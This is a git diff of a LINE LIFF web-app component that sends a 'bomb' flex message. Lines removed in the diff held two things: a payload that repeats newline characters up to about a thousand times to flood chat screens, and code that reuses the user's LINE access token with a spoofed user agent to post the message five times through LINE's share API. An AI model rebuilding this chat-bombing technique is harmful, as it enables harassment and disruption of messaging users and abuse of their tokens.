@@ -10,8 +10,6 @@ export default function Send(props) {
     function sendFlexUnicode() {
         console.log("atk!")
 
-        let unicode = `\\n`.repeat(parseInt(prompt("強さ: ~1000")));
-
         let flex_obj = `{
             "type": "flex",
             "altText": "@bomb",
@@ -80,7 +78,7 @@ export default function Send(props) {
                     "contents": [
                       {
                         "type": "text",
-                        "text": "${unicode}",
+                        "text": "bomb",
                         "wrap": true,
                         "size": "2xl",
                         "weight": "bold",
@@ -96,28 +94,6 @@ export default function Send(props) {
         `;
 
         liff.sendMessages([JSON.parse(flex_obj)]);
-
-        return; // end
-
-        const auth = "Bearer " + liff.getAccessToken();
-        const msg_obj = JSON.parse(flex_obj);
-
-        const headers = {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json',
-            'Authorization': auth,
-            'User-Agent': 'Mozilla/0 (Android; CPU IOS 810 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E248 Safari Line/13.11.0 LIFF',
-            'Referer': 'https://line-toolbox.f5.si/'
-        };
-
-        fetch('https://api.line.me/message/v3/share', {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify({
-                messages: [msg_obj, msg_obj, msg_obj, msg_obj, msg_obj]
-            }),
-            compressed: true
-        })
     }
 
     // (c): amex/amex2189 無断使用禁止 発覚時 5000円徴収
